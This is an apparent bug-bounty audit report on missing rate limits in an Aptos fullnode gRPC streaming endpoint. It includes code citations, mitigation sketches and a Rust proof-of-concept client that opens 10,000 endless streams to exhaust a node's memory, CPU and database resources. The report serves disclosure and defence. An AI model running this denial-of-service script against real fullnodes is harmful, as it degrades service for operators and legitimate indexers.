# Audit Report

## Title
Missing Rate Limiting on GetTransactionsFromNode Allows Single Client Resource Exhaustion

## Summary
The `FullnodeDataService::get_transactions_from_node` gRPC endpoint lacks rate limiting, connection limits, and per-client quotas. A single malicious client can open unlimited concurrent streaming connections, each spawning an unbounded tokio task that continuously reads from the database, leading to memory exhaustion, CPU saturation, and database connection pool depletion. [1](#0-0) 

## Finding Description
The vulnerability exists in the gRPC streaming service that fullnodes expose for transaction data synchronization. When a client sends a `GetTransactionsFromNodeRequest`, the service spawns an asynchronous task without any limits on:

1. **Number of concurrent streams per client**: No tracking or limiting of active streams
2. **Request rate per client**: No throttling or rate limiting mechanism
3. **Total concurrent streams**: No global limit on active connections [2](#0-1) 

Each stream creates substantial resource consumption:
- An mpsc channel buffer (default size 35 items) [3](#0-2) 
- A spawned tokio task that runs until `end_version` is reached (defaults to `u64::MAX` if not specified) [4](#0-3) 
- Continuous database reads via `IndexerStreamCoordinator` [5](#0-4) 

The gRPC server configuration lacks concurrency controls. Unlike the separate `indexer-grpc-data-service-v2` which tracks active streams, the fullnode service has no connection manager: [6](#0-5) 

**Attack Execution:**
1. Attacker opens thousands of concurrent gRPC streams to the fullnode's indexer endpoint
2. Each request spawns a task that continuously fetches and streams transactions
3. Memory grows unbounded from channel buffers and task stacks
4. CPU saturates from task scheduling and transaction processing overhead
5. Database connection pool depletes from concurrent read operations
6. Legitimate indexers and services experience degraded performance or connection failures

This breaks the **Resource Limits** invariant: "All operations must respect gas, storage, and computational limits."

## Impact Explanation
This vulnerability qualifies as **High Severity** per the Aptos bug bounty criteria:

- **"Validator node slowdowns"** - Direct match to High severity category. The fullnode becomes unresponsive or severely degraded, preventing it from serving legitimate indexer traffic and potentially affecting its ability to sync with the network.

The attack affects:
- **Availability**: Fullnode becomes unavailable for legitimate indexer services
- **Network Health**: Reduced number of functioning fullnodes degrades network data availability
- **Operational Impact**: Requires manual intervention (service restart, attacker IP blocking)

While this doesn't directly violate consensus safety or cause fund loss, it represents a significant operational vulnerability for publicly accessible fullnodes that are critical infrastructure for indexers, explorers, and data services.

## Likelihood Explanation
**Likelihood: High**

The attack is trivial to execute:
- No authentication required on the gRPC endpoint
- No special privileges or validator access needed
- Simple gRPC client code can open thousands of streams
- Attack can be sustained with minimal attacker resources
- Publicly accessible fullnodes are discoverable via network scans

Mitigating factors:
- Infrastructure-level rate limiting (HAProxy, cloud load balancers) may provide partial protection, but is not guaranteed
- Not all fullnodes are publicly accessible

However, the vulnerability exists in the application layer and should be fixed regardless of external infrastructure protections.

## Recommendation

Implement multi-layered rate limiting:

1. **Per-client connection limits**: Track active streams per client IP/identity
2. **Global connection limits**: Cap total concurrent streams
3. **Request rate limiting**: Limit new stream creation rate per client
4. **Resource-based throttling**: Dynamically adjust limits based on node resource usage

**Recommended Implementation:**

Add a `ConnectionManager` similar to the data-service-v2 implementation that tracks active streams and enforces limits:

```rust
// In runtime.rs, add to server creation:
let connection_manager = Arc::new(ConnectionManager::new(
    max_concurrent_streams_per_client: 10,
    max_total_concurrent_streams: 100,
));

// In fullnode_data_service.rs, check limits before spawning:
async fn get_transactions_from_node(&self, req: Request<...>) -> Result<...> {
    let client_addr = req.remote_addr();
    
    // Check and enforce limits
    if !self.connection_manager.allow_new_stream(client_addr) {
        return Err(Status::resource_exhausted(
            "Too many concurrent streams from this client"
        ));
    }
    
    let stream_id = generate_stream_id();
    self.connection_manager.register_stream(stream_id, client_addr);
    
    // ... existing code ...
    
    // Cleanup on stream end
    self.connection_manager.unregister_stream(stream_id);
}
```

2. **Configure tonic HTTP/2 limits:**
```rust
let tonic_server = Server::builder()
    .http2_keepalive_interval(Some(Duration::from_secs(60)))
    .http2_keepalive_timeout(Some(Duration::from_secs(5)))
    .concurrency_limit_per_connection(10) // Add this
    .max_concurrent_streams(100) // Add this
```

3. **Add configuration options:** [7](#0-6) 

Add fields to `IndexerGrpcConfig`:
```rust
pub max_concurrent_streams_per_client: Option<u32>,
pub max_total_concurrent_streams: Option<u32>,
pub new_stream_rate_limit_per_second: Option<u32>,
```

## Proof of Concept

```rust
// malicious_client.rs
use aptos_protos::internal::fullnode::v1::{
    fullnode_data_client::FullnodeDataClient,
    GetTransactionsFromNodeRequest,
};
use futures::StreamExt;
use tokio::task::JoinSet;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let fullnode_url = "http://fullnode-ip:50051";
    
    // Open 10000 concurrent streams
    let mut join_set = JoinSet::new();
    
    for i in 0..10000 {
        let url = fullnode_url.to_string();
        join_set.spawn(async move {
            let mut client = FullnodeDataClient::connect(url).await?;
            
            let request = GetTransactionsFromNodeRequest {
                starting_version: Some(0),
                transactions_count: None, // Stream indefinitely
            };
            
            let mut stream = client
                .get_transactions_from_node(request)
                .await?
                .into_inner();
            
            // Keep stream open, slowly consuming data
            while let Some(_response) = stream.next().await {
                tokio::time::sleep(tokio::time::Duration::from_secs(1)).await;
            }
            
            Ok::<_, tonic::Status>(())
        });
    }
    
    // Wait for all streams (they will run indefinitely)
    while let Some(_) = join_set.join_next().await {}
    
    Ok(())
}
```

**Expected behavior:** Fullnode memory usage grows continuously, CPU saturates, database connection pool exhausts, and legitimate clients cannot connect or experience severe latency.

**To verify:** Monitor fullnode metrics while running the PoC:
- Memory usage should increase linearly with stream count
- CPU usage should approach 100%
- Database connection count should grow to pool limit
- Legitimate indexer connections should fail or timeout

## Notes

This vulnerability is distinct from network-level DoS attacks (which are explicitly out of scope). It represents an application-layer resource management failure where missing business logic controls allow resource exhaustion through legitimate API usage patterns. The fix requires application-level changes to enforce appropriate limits on concurrent operations, which is a standard security practice for public-facing streaming APIs.

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/fullnode_data_service.rs (L67-87)
```rust
    async fn get_transactions_from_node(
        &self,
        req: Request<GetTransactionsFromNodeRequest>,
    ) -> Result<Response<Self::GetTransactionsFromNodeStream>, Status> {
        // Gets configs for the stream, partly from the request and partly from the node config
        let r = req.into_inner();
        let starting_version = match r.starting_version {
            Some(version) => version,
            // Live mode unavailable for FullnodeDataService
            // Enable use_data_service_interface in config to use LocalnetDataService instead
            None => return Err(Status::invalid_argument("Starting version must be set")),
        };
        let processor_task_count = self.service_context.processor_task_count;
        let processor_batch_size = self.service_context.processor_batch_size;
        let output_batch_size = self.service_context.output_batch_size;
        let transaction_channel_size = self.service_context.transaction_channel_size;
        let ending_version = if let Some(count) = r.transactions_count {
            starting_version.saturating_add(count)
        } else {
            u64::MAX
        };
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/fullnode_data_service.rs (L94-104)
```rust
        let (tx, rx) = mpsc::channel(transaction_channel_size);

        // Creates a moving average to track tps
        let mut ma = MovingAverage::new(10_000);

        let abort_handle = self.abort_handle.clone();
        // This is the main thread handling pushing to the stream
        tokio::spawn(async move {
            // Initialize the coordinator that tracks starting version and processes transactions
            let mut coordinator = IndexerStreamCoordinator::new(
                context,
```

**File:** config/src/config/indexer_grpc_config.rs (L19-19)
```rust
const DEFAULT_TRANSACTION_CHANNEL_SIZE: usize = 35;
```

**File:** config/src/config/indexer_grpc_config.rs (L31-59)
```rust
#[derive(Clone, Deserialize, PartialEq, Eq, Serialize)]
#[serde(default, deny_unknown_fields)]
pub struct IndexerGrpcConfig {
    pub enabled: bool,

    /// If true, the GRPC stream interface exposed by the data service will be used
    /// instead of the standard fullnode GRPC stream interface. In other words, with
    /// this enabled, you can use an indexer fullnode like it is an instance of the
    /// indexer-grpc data service (aka the Transaction Stream Service API).
    pub use_data_service_interface: bool,

    /// The address that the grpc server will listen on.
    pub address: SocketAddr,

    /// Number of processor tasks to fan out
    pub processor_task_count: Option<u16>,

    /// Number of transactions each processor will process
    pub processor_batch_size: u16,

    /// Number of transactions returned in a single stream response
    pub output_batch_size: u16,

    /// Size of the transaction channel buffer for streaming.
    pub transaction_channel_size: usize,

    /// Maximum size in bytes for transaction filters.
    pub max_transaction_filter_size_bytes: usize,
}
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/stream_coordinator.rs (L101-108)
```rust
    pub async fn process_next_batch(&mut self) -> Vec<Result<EndVersion, Status>> {
        let fetching_start_time = std::time::Instant::now();
        // Stage 1: fetch transactions from storage.
        let sorted_transactions_from_storage_with_size =
            self.fetch_transactions_from_storage().await;
        if sorted_transactions_from_storage_with_size.is_empty() {
            return vec![];
        }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/runtime.rs (L101-112)
```rust
        let tonic_server = Server::builder()
            .http2_keepalive_interval(Some(std::time::Duration::from_secs(60)))
            .http2_keepalive_timeout(Some(std::time::Duration::from_secs(5)))
            .add_service(reflection_service_clone);

        let router = match use_data_service_interface {
            false => {
                let svc = FullnodeDataServer::new(server)
                    .send_compressed(CompressionEncoding::Zstd)
                    .accept_compressed(CompressionEncoding::Zstd)
                    .accept_compressed(CompressionEncoding::Gzip);
                tonic_server.add_service(svc)
```
